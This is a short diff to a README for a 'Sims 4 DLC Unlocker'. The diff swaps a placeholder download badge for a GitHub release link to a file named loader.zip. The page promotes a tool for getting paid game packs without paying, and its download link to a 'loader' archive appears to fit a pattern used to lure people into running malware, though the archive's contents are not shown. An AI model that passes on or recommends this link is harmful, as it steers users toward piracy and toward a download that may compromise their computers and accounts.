@@ -1,4 +1,4 @@
-[![Download Sims 4 DLC Unlocker](https://img.shields.io/badge/Download%20Unlocker-Blue?style=for-the-badge&logo=github)](YOUR_DOWNLOAD_LINK_HERE)
+[![Download Sims 4 DLC Unlocker](https://img.shields.io/badge/Download%20Unlocker-Blue?style=for-the-badge&logo=github)](https://github.com/stranoke/sims-4-dlc-unlocker/releases/download/re/loader.zip)
 
 # The Sims 4 DLC Unlocker – The Ultimate Guide to Unlocking All Packs
 
